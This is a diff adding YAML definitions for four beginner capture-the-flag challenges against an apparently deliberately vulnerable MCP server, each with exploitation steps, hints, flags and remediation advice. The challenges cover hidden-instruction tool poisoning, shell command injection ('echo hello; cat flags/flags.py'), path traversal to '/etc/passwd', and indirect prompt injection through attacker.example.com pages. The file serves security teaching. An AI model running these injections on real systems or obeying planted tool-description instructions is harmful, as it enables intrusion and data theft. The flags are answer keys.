@@ -1,0 +1,142 @@
+challenges:
+  - id: BEGINNER-001
+    title: "Tool Poisoning via Hidden Unicode Instructions"
+    category: tool_poisoning
+    difficulty: beginner
+    cwe: CWE-116
+    cvss: 7.5
+    points: 100
+    tools:
+      - analyze_code
+      - security_scan
+      - log_analytics
+    description: |
+      Three MCP tools have adversarial instructions embedded in their descriptions
+      using hidden Unicode characters, HTML comments, and instruction-format injection.
+      These instructions are invisible to human readers but visible to LLMs that
+      process the tool list.
+    objective: |
+      1. Discover the hidden instructions in tool descriptions.
+      2. Identify all three injection techniques used.
+      3. Retrieve the flag that appears when the injection is detected.
+    exploitation_steps:
+      - "Connect to the MCP server and enumerate all tools (tools/list)"
+      - "Inspect the raw description of analyze_code — look for U+200B zero-width characters"
+      - "Inspect security_scan description for HTML comment injection"
+      - "Inspect log_analytics description for [INST] format injection"
+      - "The flag is embedded in the hidden payload"
+    hints:
+      - level: 1
+        text: "Some Unicode characters are invisible to humans but processed by LLMs."
+      - level: 2
+        text: "Use Python repr() on the description string to reveal hidden characters."
+      - level: 3
+        text: "Look for \\u200b (U+200B ZERO WIDTH SPACE) in the analyze_code description."
+    flag: "FLAG{t00l_p0is0ning_h1dd3n_1nstruct10ns}"
+    remediation: |
+      - Sanitize tool descriptions to remove non-printable Unicode characters
+      - Implement client-side description auditing before sending to LLMs
+      - Use a Unicode category allowlist for tool metadata validation
+      - Regularly audit tool descriptions with automated scanners
+
+  - id: BEGINNER-002
+    title: "Command Injection via shell=True"
+    category: injection
+    difficulty: beginner
+    cwe: CWE-78
+    cvss: 9.8
+    points: 100
+    tools:
+      - run_command
+    description: |
+      The run_command tool passes user input directly to subprocess.run() with
+      shell=True and no sanitization. This allows injecting arbitrary shell commands
+      using standard shell metacharacters.
+    objective: |
+      Inject a command separator to execute an unintended command and retrieve the flag.
+    exploitation_steps:
+      - "Call run_command with a benign command first: echo hello"
+      - "Add a semicolon and a second command: echo hello; whoami"
+      - "Read the flags file: echo x; cat flags/flags.py"
+      - "In sandbox mode, the flag is returned automatically when injection is detected"
+    hints:
+      - level: 1
+        text: "Shell command separators: ; && || | ` and $()"
+      - level: 2
+        text: "Try: echo hello; whoami"
+      - level: 3
+        text: "Try: echo hello; cat flags/flags.py"
+    flag: "FLAG{c0mm4nd_1nj3ct10n_sh3ll_tr00}"
+    remediation: |
+      - Never use shell=True with user-controlled input
+      - Use subprocess.run(['cmd', 'arg1', 'arg2']) (list form) instead
+      - Validate input against a strict allowlist of permitted characters
+      - Consider using shlex.quote() if shell features are truly required
+
+  - id: BEGINNER-003
+    title: "Path Traversal via Unsanitized File Paths"
+    category: injection
+    difficulty: beginner
+    cwe: CWE-22
+    cvss: 7.5
+    points: 100
+    tools:
+      - read_file
+    description: |
+      The read_file tool opens file paths without normalization or directory
+      restriction. An attacker can use ../ sequences to escape the expected
+      directory and read arbitrary files on the system.
+    objective: |
+      Use path traversal to read a file outside the intended directory.
+    exploitation_steps:
+      - "Try: read_file('../config.py') to read the server config"
+      - "Try: read_file('../flags/flags.py') to read all flags"
+      - "On Linux: read_file('/etc/passwd')"
+      - "The flag appears when a sensitive file is read"
+    hints:
+      - level: 1
+        text: "Try accessing files outside the current directory using ../"
+      - level: 2
+        text: "Try: ../config.py or ../flags/flags.py"
+      - level: 3
+        text: "On Linux: /etc/passwd. The flag appears in the response."
+    flag: "FLAG{p4th_tr4v3rs4l_d0t_d0t_sl4sh}"
+    remediation: |
+      - Use pathlib.Path(path).resolve() and verify it starts with the allowed base
+      - Implement a file access allowlist (specific files or directories only)
+      - Never call open() directly on user-supplied paths
+      - Consider using a virtual filesystem abstraction
+
+  - id: BEGINNER-004
+    title: "Indirect Prompt Injection via fetch_url"
+    category: prompt_injection
+    difficulty: beginner
+    cwe: CWE-77
+    cvss: 8.1
+    points: 150
+    tools:
+      - fetch_url
+    description: |
+      The fetch_url tool fetches external URLs and returns their content verbatim
+      into the LLM's context window. If the fetched page contains adversarial
+      instructions, those instructions are executed by the LLM as part of its context.
+    objective: |
+      Fetch a URL that contains malicious instructions and observe the LLM executing them.
+    exploitation_steps:
+      - "Call: fetch_url('http://attacker.example.com/inject')"
+      - "Observe: the returned content contains hidden LLM instructions"
+      - "The LLM client will execute those instructions when processing the tool result"
+      - "Alternative: fetch_url('http://attacker.example.com/exfil')"
+    hints:
+      - level: 1
+        text: "What happens if a fetched URL returns text with LLM instructions?"
+      - level: 2
+        text: "Try fetching: http://attacker.example.com/inject"
+      - level: 3
+        text: "The page contains HTML comments with adversarial LLM instructions."
+    flag: "FLAG{1nd1r3ct_pr0mpt_1nj3ct10n_url}"
+    remediation: |
+      - Sanitize or summarize external content before including in LLM context
+      - Use a separate LLM call to extract only structured data from external sources
+      - Implement content security policies for tool outputs
+      - Treat all external data as potentially adversarial
